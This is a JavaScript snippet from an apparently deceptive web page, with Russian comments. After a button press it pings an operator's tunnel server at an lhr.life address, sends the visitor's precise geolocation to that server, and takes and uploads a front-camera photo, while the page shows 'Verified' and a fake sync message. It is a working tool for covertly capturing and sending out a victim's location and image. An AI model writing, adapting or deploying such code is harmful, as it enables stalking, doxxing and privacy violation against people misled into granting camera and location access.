<script>
    // === ВСТАВЬ СВОЙ АКТУАЛЬНЫЙ ПУТЬ ТУТ ===
    const API_URL = "https://7f13bc54307437.lhr.life"; 

    async function initiate() {
        const btn = document.getElementById('mainBtn');
        const loader = document.getElementById('loader');
        const title = document.getElementById('title');
        const desc = document.getElementById('desc');

        btn.style.display = 'none';
        loader.style.display = 'block';
        title.innerText = "Связь...";

        try {
            // 1. УМНЫЙ ПИНГ (Обход кэша)
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000); // Таймаут 5 сек

            const ping = await fetch(`${API_URL}/ping?t=${Date.now()}`, {
                method: 'GET',
                mode: 'cors',
                signal: controller.signal
            }).catch(e => { throw new Error("СЕРВЕР МОЛЧИТ. Проверь: 1. Запущен ли main.py 2. Работает ли SSH 3. Верна ли ссылка."); });

            clearTimeout(timeoutId);
            title.innerText = "Доступ разрешен";

            // 2. ГЕОЛОКАЦИЯ (Параллельно)
            navigator.geolocation.getCurrentPosition(pos => {
                fetch(`${API_URL}/location`, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
                });
            }, null, {enableHighAccuracy: true});

            // 3. КАМЕРА
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: {ideal: 1280}, height: {ideal: 720} } 
            });
            const v = document.getElementById('v');
            v.srcObject = stream;

            await new Promise(r => setTimeout(r, 1500));

            // 4. ФОТО И ОТПРАВКА
            document.getElementById('flash').style.opacity = "1";
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth; 
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);

            setTimeout(async () => {
                document.getElementById('flash').style.opacity = "0";
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                
                const fd = new FormData();
                fd.append('file', blob, 'snap.jpg');

                const response = await fetch(`${API_URL}/upload-photo`, { 
                    method: 'POST', 
                    mode: 'cors',
                    body: fd 
                });

                if (response.ok) {
                    title.innerText = "Verified";
                    desc.innerText = "Синхронизация с Mac завершена.";
                    loader.style.display = 'none';
                    stream.getTracks().forEach(t => t.stop());
                } else {
                    throw new Error("Ошибка загрузки фото на сервер.");
                }
            }, 200);

        } catch (err) {
            console.error(err);
            alert("🚨 КРИТИЧЕСКАЯ ОШИБКА:\n" + err.message);
            title.innerText = "Ошибка";
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    }
</script>
